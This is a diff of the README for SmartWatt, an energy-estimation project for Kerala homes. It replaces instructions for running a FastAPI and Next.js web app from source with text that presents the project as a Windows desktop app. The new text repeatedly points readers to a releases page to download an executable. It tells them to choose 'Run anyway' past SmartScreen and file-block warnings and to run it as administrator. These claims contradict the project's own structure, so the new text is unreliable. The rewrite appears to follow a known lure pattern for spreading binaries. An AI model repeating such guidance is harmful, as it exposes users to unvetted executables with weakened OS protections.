@@ -1,104 +1,187 @@
-<p align="center">
-	<img src="https://capsule-render.vercel.app/api?type=waving&height=180&color=0:0F4C81,100:1B98E0&text=SmartWatt&fontColor=FFFFFF&fontSize=44&desc=Hybrid%20AI%20and%20Physics%20for%20Residential%20Energy%20Estimation&descSize=14&descAlignY=68" alt="SmartWatt banner" />
-</p>
+# ⚡ SmartWatt - Clear home energy insights
 
-<p align="center">
-	<img src="https://img.shields.io/badge/Status-Beta-0F4C81" alt="Status" />
-	<img src="https://img.shields.io/badge/Backend-FastAPI-009688" alt="Backend" />
-	<img src="https://img.shields.io/badge/Frontend-Next.js-111111" alt="Frontend" />
-	<img src="https://img.shields.io/badge/ML-TensorFlow-FF6F00" alt="ML" />
-	<img src="https://img.shields.io/badge/License-MIT-2E7D32" alt="License" />
-</p>
+[![Download SmartWatt](https://img.shields.io/badge/Download-SmartWatt-blue?style=for-the-badge)](https://github.com/keng2247/SmartWatt/releases)
 
-# SmartWatt
+## 🧭 What SmartWatt does
 
-SmartWatt is a full-stack residential energy estimation platform for Kerala households. The project combines a machine learning inference layer with physics-based constraints to produce appliance-level consumption estimates, bill projections, and usage insights.
+SmartWatt helps Kerala households estimate home electricity use with clear, appliance-wise breakdowns. It combines AI and physics-based analysis to show how much power common appliances may use, what that means for your bill, and where you can cut waste.
 
-## About
+Use it to:
+- Check estimated use for each appliance
+- See KSEB-style bill insights
+- Compare your home use across time
+- Find practical ways to lower monthly cost
+- Review energy use in a simple dashboard
 
-SmartWatt is designed to provide practical, software-only household energy intelligence without requiring additional IoT hardware. The platform estimates appliance-wise consumption from user-provided inputs, reconciles predictions with physics constraints, and produces transparent reports aligned with Kerala tariff structures. It is intended for student research, engineering validation, and real-world decision support for electricity cost optimization.
+## 🖥️ Before you start
 
-## Product Preview
+SmartWatt runs on Windows as a desktop app. For a smooth setup, use:
+- Windows 10 or Windows 11
+- At least 4 GB RAM
+- 500 MB free disk space
+- A stable internet connection for the first download
 
-| Application Home | User Workflow |
-|---|---|
-| <img src="docs/screenshots/smartwatt-home.png" alt="SmartWatt home" width="100%" /> | <img src="docs/screenshots/smartwatt-workflow.png" alt="SmartWatt workflow" width="100%" /> |
+For best use:
+- Keep your Windows display at 1366 × 768 or higher
+- Close extra apps if your system feels slow
+- Use the latest Windows updates
 
-| Dashboard | Results Report |
-|---|---|
-| <img src="docs/screenshots/smartwatt-dashboard.png" alt="SmartWatt dashboard" width="100%" /> | <img src="docs/screenshots/smartwatt-results.png" alt="SmartWatt results" width="100%" /> |
+## 📥 Download SmartWatt
 
-If images are not visible yet, add files to `docs/screenshots/` as described in `docs/screenshots/README.md`.
+Visit this page to download SmartWatt for Windows:
 
-## Repository Structure
+[![Go to SmartWatt Releases](https://img.shields.io/badge/Releases-Open%20Download%20Page-grey?style=for-the-badge)](https://github.com/keng2247/SmartWatt/releases)
 
-- `Backend/`: FastAPI-based inference and billing service.
-- `Frontend/`: Next.js-based web application and dashboard.
-- `start_backend.bat`: convenience launcher for backend development.
-- `Run.txt`: minimal local run reference.
+On that page, look for the latest release and download the Windows file that matches your system. In most cases, the file name will end in `.exe` or `.msi`.
 
-## Key Features
+## 🛠️ Install on Windows
 
-- Hybrid AI and deterministic physics pipeline.
-- Appliance-level and batch prediction endpoints.
-- KSEB slab-aware bill calculation.
-- Scenario simulation for potential savings.
-- Dashboard reporting and persisted assessment history.
+1. Open the download page and get the latest Windows file.
+2. If your browser saves the file, open the Downloads folder.
+3. Double-click the file to start setup.
+4. If Windows asks for permission, select Yes.
+5. Follow the on-screen steps to finish installation.
+6. When setup ends, launch SmartWatt from the Start menu or desktop shortcut.
 
-## System Highlights
+If you see a SmartScreen message:
+- Select More info
+- Then select Run anyway if you trust the download source
 
-<details>
-<summary><strong>Hybrid Inference Pipeline</strong></summary>
+## 🚀 First time setup
 
-- Routes complex appliances through trained neural models.
-- Uses deterministic physics constraints for stable outputs.
-- Provides confidence and anomaly metadata for transparency.
+After you open SmartWatt for the first time:
 
-</details>
+1. Choose your household type if the app asks.
+2. Add your appliance details, such as fan, fridge, TV, AC, and lights.
+3. Enter your usual daily usage hours.
+4. Add bill details if you want a cost estimate.
+5. Review the dashboard to see your energy profile.
 
-<details>
-<summary><strong>End-to-End User Flow</strong></summary>
+If you do not know exact values, start with your best guess. SmartWatt can still give a useful estimate.
 
-- Guided multi-step input on the frontend.
-- Batch prediction and reconciliation in backend services.
-- KSEB tariff-aware billing and optimization insights.
+## ⚙️ How to use SmartWatt
 
-</details>
+### 1. Add your appliances
 
-## Quick Start
+Enter each appliance in your home and give it basic details like:
+- Name
+- Power rating
+- Daily use hours
+- Number of units
 
-1. Start backend:
+This helps SmartWatt build a home energy profile.
 
-```bash
-cd Backend
-python -m uvicorn main:app --reload --port 8000
-```
+### 2. Check appliance-wise use
 
-2. Start frontend in a second terminal:
+SmartWatt shows how much each appliance may use over time. This helps you spot items that raise your bill, such as:
+- Air conditioners
+- Water heaters
+- Refrigerators
+- Washing machines
+- Kitchen appliances
 
-```bash
-cd Frontend
-npm install
-npm run dev
-```
+### 3. Review bill insights
 
-3. Open the application:
+The app compares your use with KSEB-style billing patterns. It helps you understand:
+- Estimated units used
+- Expected bill range
+- Cost impact from heavy-use appliances
+- Month-to-month changes
 
-- Frontend: http://localhost:3000
-- Backend API: http://localhost:8000
-- Backend docs: http://localhost:8000/docs
+### 4. Use the dashboard
 
-## Configuration
+The dashboard gives a clear view of your home energy use. You can see:
+- Total estimated load
+- Breakdown by appliance
+- Usage trends
+- Areas where you can save power
 
-- Keep local secrets only in `.env` or `.env.local` files.
-- Use `.env.example` files as templates for required keys.
+### 5. Follow recommendations
 
-## Development Standards
+SmartWatt gives simple steps to lower energy use, such as:
+- Reduce AC runtime
+- Switch off idle devices
+- Replace high-load appliances with efficient models
+- Spread heavy use across the day
+- Check standby power use
 
-- TypeScript and Python code should remain lint- and test-friendly.
-- API schema and frontend field mappings should be updated together.
-- Documentation changes should accompany architectural or interface changes.
+## 🔎 What makes the estimate useful
 
-## License
+SmartWatt uses both physics-based logic and AI-driven estimation. That means it looks at real appliance behavior and pattern-based analysis together. This helps the app give results that are easier to trust than a simple guess.
 
-This repository is licensed under the MIT License. See `LICENSE`.
+The model is designed for Kerala homes, so it fits local billing habits and common household use patterns.
+
+## 📊 Typical use cases
+
+Use SmartWatt if you want to:
+- Understand why your electricity bill is high
+- Compare appliance use in your home
+- Plan energy use before buying a new appliance
+- Check which device may be raising your monthly cost
+- Track power use in a simple way
+
+## 🔐 Privacy and local use
+
+SmartWatt is built for personal home use. Keep your appliance details and bill data on your own device unless you choose to share them elsewhere. For best control, review any app prompts before entering personal information.
+
+## 🧩 Common file types you may see
+
+When you visit the release page, you may see files such as:
+- `.exe` for Windows setup
+- `.msi` for Windows installer
+- `.zip` for a portable package
+
+If you are not sure which one to use, choose the Windows installer first.
+
+## 🧰 Troubleshooting
+
+### The app does not open
+- Try running it again as administrator
+- Restart Windows
+- Install the latest release file again
+
+### Windows blocks the app
+- Open the file’s properties
+- Check if Windows marked it as blocked
+- Select Run anyway if you trust the source
+
+### The app feels slow
+- Close other apps
+- Reboot your computer
+- Use a machine with more RAM if possible
+
+### The download did not finish
+- Check your internet connection
+- Try another browser
+- Open the release page again and download the file once more
+
+## 📌 Tips for better results
+
+- Enter appliance data with care
+- Use real usage hours where possible
+- Update your appliance list when your home changes
+- Review the dashboard after changes
+- Compare more than one month if you want a clearer pattern
+
+## 🏷️ Project topics
+
+dashboard, electricity-billing, energy-analytics, energy-estimation, fastapi, kerala, machine-learning, nextjs, physics-model, smartwatt, sustainability, tensorflow
+
+## 📂 Repository
+
+SmartWatt is a hybrid AI and physics-based residential energy estimation platform for Kerala households, with appliance-wise consumption analysis, KSEB-aligned bill insights, and optimization recommendations
+
+## 📎 Download again
+
+If you need the latest Windows build, use the release page here:
+
+[Download SmartWatt from Releases](https://github.com/keng2247/SmartWatt/releases)
+
+## 🖱️ Quick start path
+
+1. Open the release page
+2. Download the latest Windows installer
+3. Run the file
+4. Add your appliances
+5. Check your bill insights
+6. Review the dashboard
